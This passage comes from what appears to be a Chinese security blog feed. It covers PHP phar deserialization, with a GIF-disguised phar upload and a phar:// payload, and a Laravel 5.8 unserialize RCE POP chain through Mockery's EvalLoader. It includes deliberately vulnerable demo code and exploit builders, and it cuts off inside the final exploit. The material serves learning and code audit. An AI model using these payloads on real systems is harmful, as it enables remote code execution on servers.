class="line"><span class="comment">// phar_3.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObeject</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'test2.phar'</span>, <span class="number">0</span>, <span class="string">'test2.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> TestObeject();</span><br><span class="line">$o-&gt;data = <span class="string">'peri0d'</span>;</span><br><span class="line"></span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'text.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>结果</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/phar_2.png" alt></p></li></ul><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><ul><li><p><code>index.html</code> 前端上传页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./upload_file.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"Upload"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><code>upload_file.php</code> 判断文件类型并存储</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>]==<span class="string">"image/gif"</span>)&amp;&amp;(substr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>], strrpos($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>], <span class="string">'.'</span>)+<span class="number">1</span>))== <span class="string">'gif'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Upload: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Type: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Temp file: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">"upload_file/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</span><br><span class="line">      <span class="string">"upload_file/"</span> .$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload_file/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Invalid file,you can only upload gif"</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li><li><p><code>evil.php</code> 测试用的危险函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename=$_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "peri0d";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);</span><br></pre></td></tr></table></figure></li><li><p>构造 <code>attack.php</code> 生成攻击代码，访问该文件会生成一个 <code>phar.phar</code> 文件，然后将其后缀改为 <code>.gif</code> ，上传该 gif 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "peri0d";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>,<span class="number">0</span>,<span class="string">'phar.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> AnyClass();</span><br><span class="line">$o-&gt;output = <span class="string">'phpinfo();'</span>;</span><br><span class="line"></span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'text.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure></li><li><p>利用 <code>evil.php</code> 构造 payload : <code>filename=phar://upload_file/phar.gif</code></p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/phar_3.png" alt></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;初次接触 phar 反序列化，看到 ph 牛圈子以前以本题为例讨论过这个知识点，学习一下&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="phar" scheme="http://yoursite.com/tags/phar/"/>
    
  </entry>
  
  <entry>
    <title>Laravel 5.8 RCE 分析</title>
    <link href="http://yoursite.com/2019/08/14/Laravel%205.8%20RCE/"/>
    <id>http://yoursite.com/2019/08/14/Laravel 5.8 RCE/</id>
    <published>2019-08-14T09:08:14.971Z</published>
    <updated>2019-08-27T15:35:38.769Z</updated>
    
    <content type="html"><![CDATA[<p>原帖地址 : <a href="https://xz.aliyun.com/t/6059" target="_blank" rel="noopener">https://xz.aliyun.com/t/6059</a></p><p>Laravel 代码审计</p><a id="more"></a><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li><p><code>composer create-project --prefer-dist laravel/laravel laravel58</code> 安装 Laravel 5.8 并生成 <code>laravel58</code> 项目</p></li><li><p>进入项目文件夹，使用 <code>php artisan serve</code> 启动 web 服务</p></li><li><p>在 <code>laravel58/routes/web.php</code> 文件添加路由</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">"/"</span>,<span class="string">"\App\Http\Controllers\DemoController@demo"</span>);</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>在 <code>laravel58/app/Http/Controllers/</code> 下添加 <code>DemoController.php</code> 控制器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DemoController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">demo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">            $code = $_GET[<span class="string">'c'</span>];</span><br><span class="line">            unserialize($code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Welcome to laravel5.8"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><ul><li><p>ph 牛的 payload : <a href="https://github.com/ambionics/phpggc/pull/61" target="_blank" rel="noopener">https://github.com/ambionics/phpggc/pull/61</a></p></li><li><p>从 <code>Illuminate\Broadcasting\PendingBroadcast</code> 类的 <code>__destruct</code> 方法开始的 pop 链</p></li><li><p><code>Illuminate\Broadcasting\PendingBroadcast</code> 中，<code>$events</code> 必须实现 <code>Dispatcher</code> 接口，这里选择的是 <code>Illuminate\Bus\Dispatcher</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(Dispatcher $events, $event)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>Illuminate\Bus\Dispatcher</code> 中，调用 <code>dispatch</code> 方法，进入 <code>if</code> 判断，<code>$this-&gt;queueResolver</code> 是在实例化 <code>Illuminate\Bus\Dispatcher</code> 时的一个参数，它必须有值，<code>$command</code> 也就是 <code>$this-&gt;event</code> 必须实现 <code>ShouldQueue</code> 接口，这里选择的就是 <code>Illuminate\Broadcasting\BroadcastEvent</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $command : $this-&gt;event</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span><span class="params">($command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;queueResolver &amp;&amp; <span class="keyword">$this</span>-&gt;commandShouldBeQueued($command)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dispatchToQueue($command);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dispatchNow($command);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(Container $container, Closure $queueResolver = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;container = $container;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;queueResolver = $queueResolver;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;pipeline = <span class="keyword">new</span> Pipeline($container);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">commandShouldBeQueued</span><span class="params">($command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $command <span class="keyword">instanceof</span> ShouldQueue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>到这里，构造出的 exp : </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($evilCode)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="keyword">new</span> \Illuminate\Bus\Dispatcher();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="keyword">new</span> BroadcastEvent($evilCode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>然后进入 <code>dispatchToQueue</code> 方法，存在 <code>call_user_func</code> 方法，其中的 <code>$this-&gt;queueResolver</code> 是可控的，这里利用的是 <code>Mockery\Loader\EvalLoader</code> 的 <code>load</code> 方法，即 <code>$this-&gt;queueResolver</code> 为 <code>array(new Mockery\Loader\EvalLoader(), &quot;load&quot;)</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatchToQueue</span><span class="params">($command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $connection = $command-&gt;connection ?? <span class="keyword">null</span>;</span><br><span class="line">    </span><br><span class="line">    $queue = call_user_func(<span class="keyword">$this</span>-&gt;queueResolver, $connection);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (! $queue <span class="keyword">instanceof</span> Queue) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'Queue resolver did not return a Queue implementation.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method_exists($command, <span class="string">'queue'</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> $command-&gt;queue($queue, $command);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pushCommandToQueue($queue, $command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>这个点的意思就是</p><ol><li><code>$this-&gt;events</code> 调用 <code>dispatch</code> 传入参数 <code>$this-&gt;event</code> 后</li><li>访问 <code>$this-&gt;events</code> 的 <code>queueResolver</code> 属性</li><li>调用 <code>$this-&gt;events-&gt;commandShouldBeQueued($this-&gt;event)</code> 方法</li><li>调用 <code>dispatchToQueue</code> 传入 <code>$this-&gt;event</code> 参数。其中的 <code>$connection</code> 为 <code>$this-&gt;event-&gt;connection</code> ，即 <code>Illuminate\Broadcasting\BroadcastEvent</code> 中的 <code>$connection</code> 属性</li><li><code>call_user_func</code> 将 <code>$connection</code> 作为参数传给 <code>$this-&gt;queueResolver</code> 返回的函数</li></ol></li><li><p>到这里，构造出的 exp 如下，已经实现 <code>call_user_func($this-&gt;queueResolver, $connection)</code> 即 <code>call_user_func($evilFunc, $evilCode)</code> ，接下来就要寻找一个可以利用的函数，这里选择的是 <code>Mockery\Loader\EvalLoader</code> ，继续跟进</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($evilCode)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="keyword">new</span> \Illuminate\Bus\Dispatcher();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="keyword">new</span> BroadcastEvent($evilCode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BroadcastEvent</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $connection;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($evilCode)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = $evilCode;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = $evilFunc;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>Mockery\Loader\EvalLoader</code> 中有一个 <code>eval</code> 函数可以利用，这里的 <code>$definition</code> 是 <code>MockDefinition</code> 类的实例化对象，也就说明 <code>$this-&gt;event-&gt;connection</code> 是 <code>MockDefinition</code> 类的实例化对象。接下来就是绕过 <code>if</code> 判断。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EvalLoader</span> <span class="keyword">implements</span> <span class="title">Loader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span><span class="params">(MockDefinition $definition)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (class_exists($definition-&gt;getClassName(), <span class="keyword">false</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"?&gt;"</span> . $definition-&gt;getCode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>跟进 <code>Mockery\Generator\MockDefinition</code> ，如果要绕过 <code>if</code> 判断，必须让 <code>getClassName</code> 返回一个不存在的类名，即 <code>$this-&gt;config-&gt;getName()</code> 返回一个不存在的类名。<code>$config</code> 为 <code>Mockery\Generator\MockConfiguration</code> 的实例化对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockDefinition</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $config;</span><br><span class="line">    <span class="keyword">protected</span> $code;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(MockConfiguration $config, $code)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!$config-&gt;getName()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \InvalidArgumentException(<span class="string">"MockConfiguration must contain a name"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = $config;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = $code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConfig</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;config;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getClassName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;config-&gt;getName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;code;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>Mockery\Generator\MockConfiguration</code> 中，让 <code>getName()</code> 返回一个不存在的类名，最终执行 <code>eval(&quot;?&gt;&quot; . $definition-&gt;getCode());</code> 实现 RCE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>最终的 exp ，(ph 牛的 exp ) : </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span 